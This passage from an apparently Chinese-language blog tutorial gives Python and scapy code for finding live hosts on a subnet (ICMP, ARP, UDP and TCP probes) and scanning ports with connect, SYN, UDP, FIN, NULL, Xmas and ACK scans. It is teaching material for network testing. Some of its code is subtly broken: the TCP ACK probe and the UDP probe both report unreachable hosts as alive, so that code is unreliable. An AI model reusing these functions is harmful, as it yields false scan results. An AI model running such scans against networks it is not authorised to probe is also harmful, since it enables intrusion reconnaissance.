class="hljs-keyword">in</span> ports:<br>        <span class="hljs-keyword">try</span>:<br>            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>            sock.settimeout(<span class="hljs-number">1</span>)  <span class="hljs-comment"># 设置超时为1秒</span><br>            result = sock.connect_ex((ip, port))<br>            sock.close()<br>            <span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># 端口开放，认为主机存活</span><br>        <span class="hljs-keyword">except</span> socket.error:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># TCP ACK 探测</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tcp_ack_scan</span>(<span class="hljs-params">ip, ports=COMMON_TCP_PORTS</span>):<br>    <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> ports:<br>        <span class="hljs-keyword">try</span>:<br>            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>            sock.settimeout(<span class="hljs-number">1</span>)<br>            sock.connect_ex((ip, port))  <span class="hljs-comment"># 连接尝试</span><br>            sock.close()<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># 目标端口存在，认为主机存活</span><br>        <span class="hljs-keyword">except</span> socket.error:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># ARP 探测</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arp_ping</span>(<span class="hljs-params">ip</span>):<br>    arp_request = ARP(pdst=ip)<br>    ether_frame = Ether(dst=<span class="hljs-string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>) / arp_request<br>    result = srp(ether_frame, timeout=<span class="hljs-number">1</span>, verbose=<span class="hljs-literal">False</span>)[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(result) &gt; <span class="hljs-number">0</span>  <span class="hljs-comment"># 如果有响应，主机存活</span><br><br><span class="hljs-comment"># UDP 探测</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">udp_ping</span>(<span class="hljs-params">ip, port=<span class="hljs-number">53</span></span>):<br>    <span class="hljs-keyword">try</span>:<br>        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>        sock.settimeout(<span class="hljs-number">1</span>)  <span class="hljs-comment"># 设置超时</span><br>        sock.sendto(<span class="hljs-string">b&quot;UDP test&quot;</span>, (ip, port))<br>        <span class="hljs-comment"># 等待 ICMP 端口不可达消息</span><br>        response = sr1(IP(dst=ip)/ICMP(), timeout=<span class="hljs-number">1</span>, verbose=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">return</span> response <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>  <span class="hljs-comment"># 如果没有返回 ICMP 端口不可达消息，说明目标存在</span><br>    <span class="hljs-keyword">except</span> socket.timeout:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> socket.error:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 综合扫描方法</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_host</span>(<span class="hljs-params">ip, methods=[<span class="hljs-string">&quot;icmp&quot;</span>, <span class="hljs-string">&quot;arp&quot;</span>, <span class="hljs-string">&quot;udp&quot;</span>, <span class="hljs-string">&quot;syn&quot;</span>, <span class="hljs-string">&quot;ack&quot;</span>]</span>):<br>    <span class="hljs-comment"># 如果任意一个探测方法发现主机存活，则返回 True</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;icmp&quot;</span> <span class="hljs-keyword">in</span> methods <span class="hljs-keyword">and</span> icmp_ping(ip):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;arp&quot;</span> <span class="hljs-keyword">in</span> methods <span class="hljs-keyword">and</span> ipaddress.ip_address(ip).is_private:  <span class="hljs-comment"># 仅局域网内使用 ARP</span><br>        <span class="hljs-keyword">if</span> arp_ping(ip):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;udp&quot;</span> <span class="hljs-keyword">in</span> methods <span class="hljs-keyword">and</span> udp_ping(ip):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;syn&quot;</span> <span class="hljs-keyword">in</span> methods <span class="hljs-keyword">and</span> tcp_syn_scan(ip):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ack&quot;</span> <span class="hljs-keyword">in</span> methods <span class="hljs-keyword">and</span> tcp_ack_scan(ip):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 扫描子网</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_subnet</span>(<span class="hljs-params">network, methods=[<span class="hljs-string">&quot;icmp&quot;</span>, <span class="hljs-string">&quot;syn&quot;</span>, <span class="hljs-string">&quot;ack&quot;</span>, <span class="hljs-string">&quot;arp&quot;</span>, <span class="hljs-string">&quot;udp&quot;</span>]</span>):<br>    net = ipaddress.IPv4Network(network, strict=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> net.hosts():<br>        threading.Thread(target=scan_and_print, args=(<span class="hljs-built_in">str</span>(ip), methods)).start()<br><br><span class="hljs-comment"># 扫描单个 IP</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_single_ip</span>(<span class="hljs-params">ip, methods=[<span class="hljs-string">&quot;icmp&quot;</span>, <span class="hljs-string">&quot;syn&quot;</span>, <span class="hljs-string">&quot;ack&quot;</span>, <span class="hljs-string">&quot;arp&quot;</span>, <span class="hljs-string">&quot;udp&quot;</span>]</span>):<br>    <span class="hljs-keyword">if</span> scan_host(ip, methods):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip&#125;</span> is Alive&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip&#125;</span> is Dead&quot;</span>)<br><br><span class="hljs-comment"># 打印扫描结果</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_scan_results</span>(<span class="hljs-params">ip, is_alive</span>):<br>    <span class="hljs-keyword">if</span> is_alive:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip&#125;</span> is Alive&quot;</span>)<br><br><span class="hljs-comment"># 处理扫描并打印结果</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_and_print</span>(<span class="hljs-params">ip, methods</span>):<br>    is_alive = scan_host(ip, methods)<br>    print_scan_results(ip, is_alive)<br><br><span class="hljs-comment"># 主函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    target = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter a subnet (e.g., 192.168.1.0/24) or IP (e.g., 192.168.1.1): &quot;</span>)<br>    <br>    <span class="hljs-comment"># 如果是单个IP扫描</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target:<br>        scan_single_ip(target)<br>    <br>    <span class="hljs-comment"># 如果是子网扫描</span><br>    <span class="hljs-keyword">else</span>:<br>        scan_subnet(target)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><h1 id="二、端口开放探测器"><a href="#二、端口开放探测器" class="headerlink" title="二、端口开放探测器"></a>二、端口开放探测器</h1><h2 id="2-1-TCP-全连接扫描"><a href="#2-1-TCP-全连接扫描" class="headerlink" title="2.1 TCP 全连接扫描"></a>2.1 TCP 全连接扫描</h2><ul><li>原理： 尝试与目标的指定端口建立 TCP 连接，成功则端口开放。</li><li>实现方法：<ul><li>通过<code>socket.connect_ex()</code>创建 sock</li><li>通过 sock 与指定端口建立 TCP 链接，成功则端口开放。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tcp_connect_scan</span>(<span class="hljs-params">target_ip, port</span>):<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> sock:<br>        sock.settimeout(<span class="hljs-number">1</span>)  <span class="hljs-comment"># 设置超时时间，避免长时间等待</span><br>        result = sock.connect_ex((target_ip, port))<br>        <span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 开放&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 关闭&quot;</span><br><br>target = <span class="hljs-string">&quot;192.168.1.1&quot;</span><br><span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>, <span class="hljs-number">25</span>):<br>    <span class="hljs-built_in">print</span>(tcp_connect_scan(target, port))<br><br></code></pre></td></tr></table></figure><h2 id="2-2-TCP-半连接扫描"><a href="#2-2-TCP-半连接扫描" class="headerlink" title="2.2 TCP 半连接扫描"></a>2.2 TCP 半连接扫描</h2><ul><li>原理：向目标的指定端口发送 TCP SYN 包，如果目标返回 SYN-ACK，则端口开放</li><li>实现方法：<ul><li>指定一个端口发送 TCP SYN 包</li><li>等待 SYN-ACK 响应，若收到响应，则端口开放</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">syn_scan</span>(<span class="hljs-params">target_ip, port</span>):<br>    src_port = RandShort()  <span class="hljs-comment"># 随机源端口</span><br>    syn_packet = IP(dst=target_ip)/TCP(sport=src_port, dport=port, flags=<span class="hljs-string">&quot;S&quot;</span>)<br>    response = sr1(syn_packet, timeout=<span class="hljs-number">1</span>, verbose=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-keyword">if</span> response <span class="hljs-keyword">and</span> response.haslayer(TCP):<br>        <span class="hljs-keyword">if</span> response.getlayer(TCP).flags == <span class="hljs-number">0x12</span>:  <span class="hljs-comment"># SYN-ACK</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 开放&quot;</span><br>        <span class="hljs-keyword">elif</span> response.getlayer(TCP).flags == <span class="hljs-number">0x14</span>:  <span class="hljs-comment"># RST</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 关闭&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 过滤或无响应&quot;</span><br><br>target = <span class="hljs-string">&quot;192.168.1.1&quot;</span><br><span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>, <span class="hljs-number">25</span>):<br>    <span class="hljs-built_in">print</span>(syn_scan(target, port))<br><br></code></pre></td></tr></table></figure><h2 id="2-3-UDP-扫描"><a href="#2-3-UDP-扫描" class="headerlink" title="2.3  UDP 扫描"></a>2.3  UDP 扫描</h2><ul><li>原理：向目标端口发送 UDP 数据包，如果没有响应，则端口可能是开放或被过滤。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">udp_scan</span>(<span class="hljs-params">target_ip, port</span>):<br>    udp_packet = IP(dst=target_ip)/UDP(dport=port)<br>    response = sr1(udp_packet, timeout=<span class="hljs-number">2</span>, verbose=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:  <span class="hljs-comment"># 没有响应，可能开放或被过滤</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 开放或被过滤&quot;</span><br>    <span class="hljs-keyword">elif</span> response.haslayer(ICMP) <span class="hljs-keyword">and</span> response.getlayer(ICMP).<span class="hljs-built_in">type</span> == <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 关闭&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 开放&quot;</span><br><br>target = <span class="hljs-string">&quot;192.168.1.1&quot;</span><br><span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> [<span class="hljs-number">53</span>, <span class="hljs-number">161</span>, <span class="hljs-number">69</span>]:<br>    <span class="hljs-built_in">print</span>(udp_scan(target, port))<br><br></code></pre></td></tr></table></figure><h2 id="2-4-TCP-FIN-扫描"><a href="#2-4-TCP-FIN-扫描" class="headerlink" title="2.4  TCP FIN 扫描"></a>2.4  TCP FIN 扫描</h2><ul><li>原理：向目标发送一个带有 FIN 标志的数据包，如果返回 RST 包，则相应端口关闭。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fin_scan</span>(<span class="hljs-params">target_ip, port</span>):<br>    fin_packet = IP(dst=target_ip)/TCP(dport=port, flags=<span class="hljs-string">&quot;F&quot;</span>)<br>    response = sr1(fin_packet, timeout=<span class="hljs-number">1</span>, verbose=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:  <span class="hljs-comment"># 无响应，可能端口开放</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 开放或被过滤&quot;</span><br>    <span class="hljs-keyword">elif</span> response.haslayer(TCP) <span class="hljs-keyword">and</span> response.getlayer(TCP).flags == <span class="hljs-number">0x14</span>:  <span class="hljs-comment"># RST</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 关闭&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 过滤&quot;</span><br><br>target = <span class="hljs-string">&quot;192.168.1.1&quot;</span><br><span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>, <span class="hljs-number">25</span>):<br>    <span class="hljs-built_in">print</span>(fin_scan(target, port))<br><br></code></pre></td></tr></table></figure><h2 id="2-5-NULL-扫描"><a href="#2-5-NULL-扫描" class="headerlink" title="2.5  NULL 扫描"></a>2.5  NULL 扫描</h2><ul><li>原理：发送没有任何 TCP 标志位的数据包，如果接收到 RST 包，则相应端口关闭。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">null_scan</span>(<span class="hljs-params">target_ip, port</span>):<br>    null_packet = IP(dst=target_ip)/TCP(dport=port, flags=<span class="hljs-string">&quot;&quot;</span>)<br>    response = sr1(null_packet, timeout=<span class="hljs-number">1</span>, verbose=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 开放或被过滤&quot;</span><br>    <span class="hljs-keyword">elif</span> response.haslayer(TCP) <span class="hljs-keyword">and</span> response.getlayer(TCP).flags == <span class="hljs-number">0x14</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 关闭&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 过滤&quot;</span><br><br>target = <span class="hljs-string">&quot;192.168.1.1&quot;</span><br><span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>, <span class="hljs-number">25</span>):<br>    <span class="hljs-built_in">print</span>(null_scan(target, port))<br><br></code></pre></td></tr></table></figure><h2 id="2-6-Xmas-扫描"><a href="#2-6-Xmas-扫描" class="headerlink" title="2.6  Xmas 扫描"></a>2.6  Xmas 扫描</h2><ul><li>原理： 发送同时设置了 FIN、PSH、URG 标志的数据包，关闭端口返回 RST，开放端口无响应。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">xmas_scan</span>(<span class="hljs-params">target_ip, port</span>):<br>    xmas_packet = IP(dst=target_ip)/TCP(dport=port, flags=<span class="hljs-string">&quot;FPU&quot;</span>)<br>    response = sr1(xmas_packet, timeout=<span class="hljs-number">1</span>, verbose=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 开放或被过滤&quot;</span><br>    <span class="hljs-keyword">elif</span> response.haslayer(TCP) <span class="hljs-keyword">and</span> response.getlayer(TCP).flags == <span class="hljs-number">0x14</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 关闭&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 过滤&quot;</span><br><br>target = <span class="hljs-string">&quot;192.168.1.1&quot;</span><br><span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>, <span class="hljs-number">25</span>):<br>    <span class="hljs-built_in">print</span>(xmas_scan(target, port))<br><br></code></pre></td></tr></table></figure><h2 id="2-7-TCP-ACK-扫描"><a href="#2-7-TCP-ACK-扫描" class="headerlink" title="2.7  TCP ACK 扫描"></a>2.7  TCP ACK 扫描</h2><ul><li>作用：用于判断防火墙的规则。</li><li>原理： 发送一个带 ACK 标志的数据包，无论端口开放还是关闭，目标通常都会返回 RST；但如果数据包被过滤，则不会有响应。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ack_scan</span>(<span class="hljs-params">target_ip, port</span>):<br>    ack_packet = IP(dst=target_ip)/TCP(dport=port, flags=<span class="hljs-string">&quot;A&quot;</span>)<br>    response = sr1(ack_packet, timeout=<span class="hljs-number">1</span>, verbose=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 可能被防火墙过滤&quot;</span><br>    <span class="hljs-keyword">elif</span> response.haslayer(TCP) <span class="hljs-keyword">and</span> response.getlayer(TCP).flags == <span class="hljs-number">0x14</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 未被过滤（可达）&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;端口 <span class="hljs-subst">&#123;port&#125;</span> 过滤&quot;</span><br><br>target = <span class="hljs-string">&quot;192.168.1.1&quot;</span><br><span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>, <span class="hljs-number">25</span>):<br>    <span class="hljs-built_in">print</span>(ack_scan(target, port))<br><br></code></pre></td></tr></table></figure><h2 id="2-8-端口开放探测实现"><a href="#2-8-端口开放探测实现" class="headerlink" title="2.8 端口开放探测实现"></a>2.8 端口开放探测实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> IP, TCP, sr1, send<br><br><span class="hljs-comment"># 基础扫描方法实现</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tcp_connect_scan</span>(<span class="hljs-params">target, port, timeout=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;TCP 全连接扫描&quot;&quot;&quot;</span><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.settimeout(timeout)<br>    <span class="hljs-keyword">try</span>:<br>        result = s.connect_ex((target, port))<br>        s.close()<br>        <span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">syn_scan</span>(<span class="hljs-params">target, port, timeout=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;SYN 扫描&quot;&quot;&quot;</span><br>    packet = IP(dst=target) / TCP(dport=port, flags=<span class="hljs-string">&quot;S&quot;</span>)<br>    response = sr1(packet, timeout=timeout, verbose=<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>  <span class="hljs-comment"># 无响应，可能被过滤</span><br>    <span class="hljs-keyword">elif</span> response.haslayer(TCP):<br>        tcp_layer = response.getlayer(TCP)<br>        <span class="hljs-comment"># 如果收到 SYN/ACK</span><br>        <span class="hljs-keyword">if</span> tcp_layer.flags == <span class="hljs-number">0x12</span>:<br>            <span class="hljs-comment"># 发送 RST 断开连接</span><br>            rst_pkt = IP(dst=target) / TCP(dport=port, flags=<span class="hljs-string">&quot;R&quot;</span>)<br>            send(rst_pkt, verbose=<span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">elif</span> tcp_layer.flags == <span class="hljs-number">0x14</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fin_scan</span>(<span class="hljs-params">target, port, timeout=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;FIN 扫描&quot;&quot;&quot;</span><br>    packet = IP(dst=target) / TCP(dport=port, flags=<span class="hljs-string">&quot;F&quot;</span>)<br>    response = sr1(packet, timeout=timeout, verbose=<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>  <span class="hljs-comment"># 无响应，可能开放或被过滤</span><br>    <span class="hljs-keyword">elif</span> response.haslayer(TCP) <span class="hljs-keyword">and</span> response.getlayer(TCP).flags == <span class="hljs-number">0x14</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 综合扫描方法，根据多个扫描结果综合判断端口状态</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">combined_scan</span>(<span class="hljs-params">target, port, timeout=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    综合使用 SYN、TCP Connect、FIN 扫描来确定端口状态。</span><br><span class="hljs-string">    逻辑说明：</span><br><span class="hljs-string">      1. 首先使用 SYN 